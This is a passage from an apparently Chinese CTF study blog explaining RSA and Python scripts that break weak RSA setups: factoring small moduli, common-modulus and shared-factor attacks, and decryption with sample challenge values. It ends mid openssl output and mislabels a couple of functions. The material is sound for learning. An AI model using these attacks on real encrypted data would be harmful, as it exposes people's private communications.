A在1到3120上随机选择了一个随机数e&#x3D;17，与3120互素.</span><br><span class="line">4. 计算e对φ(n)的模反元素d，即时，ed-1&#x3D;kφ(n)。</span><br><span class="line">   即使求解：17x+3120y&#x3D;1.用扩展欧几里得算法求解。可以算出一组解(x,y)&#x3D;(2753,-15)，即d&#x3D;2753. 公钥(3233, 17)，私钥(3233,2753)</span><br></pre></td></tr></table></figure><h4 id="加解密过程"><a href="#加解密过程" class="headerlink" title="加解密过程"></a>加解密过程</h4><p>明文：<code>m</code></p><p>密文：<code>c</code> </p><p>两个数：<code>p、q</code><br>n：<code>q×p</code><br>f(n)：<code>(p-1)×(q-1)</code><br>e：<code>与f(n)互为质数</code><br>d：<code>e×d=1 mod f(n)</code></p><h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><p>公钥加密—-(n,e)—-(33,3)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;m^e%N</span><br></pre></td></tr></table></figure><h5 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;c^d%N</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选择两个大素数p和q，计算出模数N &#x3D; p * q</span><br><span class="line">计算φ &#x3D; (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质</span><br><span class="line">取e的模反数为d，计算方法: e * d ≡ 1 (mod φ)</span><br><span class="line">对明文m进行加密：c &#x3D; pow(m, e, N)，得到的c即为密文</span><br><span class="line">对密文c进行解密，m &#x3D; pow(c, d, N)，得到的m即为明文</span><br></pre></td></tr></table></figure><h3 id="Python与RSA"><a href="#Python与RSA" class="headerlink" title="Python与RSA"></a>Python与RSA</h3><p>求p、q</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N&#x3D;30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511</span><br><span class="line">q&#x3D;57970027</span><br><span class="line">print(N&#x2F;&#x2F;q)</span><br></pre></td></tr></table></figure><p>分解N</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 98554799767</span><br><span class="line">for i in range(2, N):</span><br><span class="line">    if N % i &#x3D;&#x3D; 0:</span><br><span class="line">        print (i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python2</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">N=<span class="number">322831561921859</span></span><br><span class="line">factor=FactorDB(N)</span><br><span class="line">factor.connect()</span><br><span class="line">factor_list=factor.get_factor_list()</span><br><span class="line">print(factor_list)</span><br></pre></td></tr></table></figure><p>求解D</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D &#x3D; gmpy2.invert(e,n) # 求逆元，de &#x3D; 1 mod n</span><br></pre></td></tr></table></figure><p>返回的D的类型为&lt;class ‘mpz’&gt;</p><p>欧几里得算法求D</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D&#x3D;gmpy2.gcd(a,b)</span><br></pre></td></tr></table></figure><p>求明文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;pow(int(c),d,n)</span><br></pre></td></tr></table></figure><p>其中d的类型是&lt;class ‘mpz’&gt;</p><p>初始化一个大整数x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.mpz(x)</span><br></pre></td></tr></table></figure><p>libnum库</p><p>libnum.s2n(s)：字符串转换为数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">s &#x3D; &quot;ab12&quot;</span><br><span class="line">print(libnum.s2n(s))</span><br><span class="line"></span><br><span class="line">result: 1633825074</span><br></pre></td></tr></table></figure><p>libnum.s2n(n)：数字转换为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n &#x3D; 1633825074</span><br><span class="line">print(libnum.n2s(n))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure><p>libnum.s2b(s)：字符串转换为二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">s &#x3D; &quot;ab12&quot;</span><br><span class="line">print(libnum.s2b(s))</span><br><span class="line"></span><br><span class="line">result: 01100001011000100011000100110010</span><br></pre></td></tr></table></figure><p>libnum.b2s(b)：二进制字符串转换为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">b &#x3D; &quot;01100001011000100011000100110010&quot;</span><br><span class="line">print(libnum.b2s(b))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure><p>求d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line">p = <span class="number">3487583947589437589237958723892346254777</span>  </span><br><span class="line">q = <span class="number">8767867843568934765983476584376578389</span>  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)       </span><br><span class="line">d = gmpy2.invert(e,phi) </span><br><span class="line"><span class="keyword">print</span> d </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">p = <span class="number">3487583947589437589237958723892346254777</span>  </span><br><span class="line">q = <span class="number">8767867843568934765983476584376578389</span>  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi) </span><br><span class="line"><span class="keyword">print</span> d  </span><br></pre></td></tr></table></figure><h3 id="CTF-中的RSA"><a href="#CTF-中的RSA" class="headerlink" title="CTF-中的RSA"></a>CTF-中的RSA</h3><p>总体思路就是获取秘文然后根据给的条件解密。</p><h4 id="爆破因子"><a href="#爆破因子" class="headerlink" title="爆破因子"></a>爆破因子</h4><p>模数N过小时，我们可以写个脚本直接爆破他的因子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 920139713</span><br><span class="line">for i in range(2, N):</span><br><span class="line">    if N % i &#x3D;&#x3D; 0:</span><br><span class="line">        print (i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">q=<span class="number">18443</span></span><br><span class="line">p=<span class="number">49891</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">f=open(<span class="string">&#x27;/Users/apple/Desktop/1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    m=pow(int(i),d,n)</span><br><span class="line">    flag+=chr(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="求N、P、Q"><a href="#求N、P、Q" class="headerlink" title="求N、P、Q"></a>求N、P、Q</h4><p>前提：</p><p>题目给出了p+q,(p+1)(q+1),e,d,c。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(p+<span class="number">1</span>)(q+<span class="number">1</span>)=p*q+p+q+<span class="number">1</span>=n+(p+q)+<span class="number">1</span>=x</span><br><span class="line">n=x-(p+q+<span class="number">1</span>)</span><br><span class="line">y=(q+p+<span class="number">1</span>)</span><br><span class="line">n=x-y</span><br><span class="line">phi=(p<span class="number">-1</span>)(q<span class="number">-1</span>)</span><br><span class="line">   =p*q-p-q+<span class="number">1</span></span><br><span class="line">   =p*q-(p+q)+<span class="number">1</span></span><br><span class="line">   =n-y+<span class="number">2</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">x = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span> + <span class="number">1</span>  </span><br><span class="line">y = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span>  </span><br><span class="line">c = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span>  </span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span>  </span><br><span class="line">n = y-x  </span><br><span class="line">phi = n-x+<span class="number">2</span>  </span><br><span class="line">d =gmpy2.invert(e,phi)  </span><br><span class="line">m = pow(c,d,n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h4 id="直接求d"><a href="#直接求d" class="headerlink" title="直接求d"></a>直接求d</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">p =  <span class="number">473398607161</span></span><br><span class="line">q =  <span class="number">4511491</span></span><br><span class="line">e =  <span class="number">17</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">n=q*p</span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h4 id="常规脚本"><a href="#常规脚本" class="headerlink" title="常规脚本"></a>常规脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">n=q*p</span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">m=pow(int(c),d,n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h4 id="公共模数攻击"><a href="#公共模数攻击" class="headerlink" title="公共模数攻击"></a>公共模数攻击</h4><p>前提：</p><p>共模、知道公钥、未知D、gcd(e1,e2)==1,通常已经知道c1、c2、e1、e2、n1。</p><p>判断gcd(e1,e2)==1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"><span class="keyword">if</span> gcd(e1,e2)==<span class="number">1</span>:</span><br><span class="line">print(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1 = libnum.s2n(open(<span class="string">&quot;./veryhardRSA/flag.enc1&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">c2 = libnum.s2n(open(<span class="string">&quot;./veryhardRSA/flag.enc2&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">797</span></span><br><span class="line">e2 = <span class="number">521</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930</span></span><br><span class="line">c2 = <span class="number">6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849</span></span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><h4 id="共同公约数"><a href="#共同公约数" class="headerlink" title="共同公约数"></a>共同公约数</h4><p>前提：</p><p>如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将p和q分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1=<span class="number">9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span></span><br><span class="line"></span><br><span class="line">flag=gmpy2.gcd(n1,n2)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="十六进制与十进制转换"><a href="#十六进制与十进制转换" class="headerlink" title="十六进制与十进制转换"></a>十六进制与十进制转换</h4><p>十进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">n=<span class="number">30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511</span></span><br><span class="line">p=<span class="number">518629368090170828331048663550229634444384299751272939077168648935075604180676006392464524953128293842996441022771890719731811852948684950388211907532651941639114462313594608747413310447500790775078081191686616804987790818396104388332734677935684723647108960882771460341293023764117182393730838418468480006985768382115446225422781116531906323045161803441960506496275763429558238732127362521949515590606221409745127192859630468854653290302491063292735496286233738504010613373838035073995140744724948933839238851600638652315655508861728439180988253324943039367876070687033249730660337593825389358874152757864093</span></span><br><span class="line">q=<span class="number">57970027</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">7794723418575865133221710844957533763600341922604517613342495747603012554180094280541823023634873599126585279853308940496678282266476710442981516354722804125430496779901585048718048185233664790252394684332465074382441230073678600882729934579182285214951880877250418707254283530428901115269852700826395665491878667661628136001999399484533201783253765516767750014674954245926135408324886326143714299876277011335423927566142213389260930015587242338816401180184690143281167398845157288962617745058933037815909282349958256327539704772842249498887000705177364153517572284141825022022854893024073953342334031407154501829377</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">m=hex(int(pow(int(c),d,n)))</span><br><span class="line">flag=binascii.a2b_hex(m[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>十六进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math<span class="comment">#python2</span></span><br><span class="line">N=<span class="number">0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9f</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">d=<span class="number">0x9186c78d098af6815622ea9901cf84a89ead578a6dbdded7d7fc63531756239dc586501216fc2e4bd1a8cee7e62284d16d91195f356d733a52dff011ebc3bf1e5d62af54d0455ea2f6ec948f45f34931f5b0b4478b16c66951a95d2f069a6c8867a6bc673c8e40052a54dbc5c1aeacbbfae7cad150a4f41ef4a02b1c97d70636ae187ed3c45f2551696a6a1172ae4089e033fb4853057c0f1e227d71ccf24fb27073ca4fe4ac3744dfed2cd7763c47ac4ae4d42820a19d68961bc103bb9016197463875169d062b45807e2e86aa17fa65e3088cc75ef35f984d0ca92d4c9270c2e694eb1f5df16b7ebe32b5c1d26086d6aac5fe327288f2904cb54164db39151</span></span><br><span class="line">c=<span class="number">0x3dbf00a02f924a70f44bdd69e73c46241e9f036bfa49a0c92659d8eb0fe47e42068eaf156a9b3ee81651bc0576a91ffed48610c158dc8d2fb1719c7242704f0d965f8798304925a322c121904b91e5fc5eb3dc960b03eb8635be53b995217d4c317126e0ec6e9a9acfd5d915265634a22a612de962cfaa2e0443b78bdf841ff901423ef765e3d98b38bcce114fede1f13e223b9bd8155e913c8670d8b85b1f3bcb99353053cdb4aef1bf16fa74fd81e42325209c0953a694636c0ce0a19949f343dc229b2b7d80c3c43ebe80e89cbe3a3f7c867fd7cee06943886b0718a4a3584c9d9f9a66c9de29fda7cfee30ad3db061981855555eeac01940b1924eb4c301</span></span><br><span class="line">print(hex(pow(c,d,N))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="pem、-pub、flag-enc"><a href="#pem、-pub、flag-enc" class="headerlink" title=".pem、.pub、flag.enc"></a><code>.pem</code>、<code>.pub</code>、<code>flag.enc</code></h4><p>公钥：通常是以.pem或.pub结尾的文件。</p><p>密文：通常叫做flag.enc之类的。</p><p>私钥：pem文件</p><h5 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h5><h6 id="获取n和e"><a href="#获取n和e" class="headerlink" title="获取n和e"></a>获取n和e</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl</span><br><span class="line">OpenSSL&gt; rsa -pubin -text -modulus -<span class="keyword">in</span> /Users/apple/Downloads/mediumRSA/pubkey.pem</span><br><span class="line">Public-Key: (<span class="number">256</span> bit)</span><br><span class="line">Modulus:</span><br><span class="line">    <span class="number">00</span>:c2:<span class="number">63</span>:<span class="number">6</span>a:e5:c3:d8:e4:<span class="number">3</span>f:fb:<span class="number">97</span>:ab:<span class="number">09</span>:<span class="number">02</span>:<span class="number">8</span>f:</span><br><span class="line">    <span 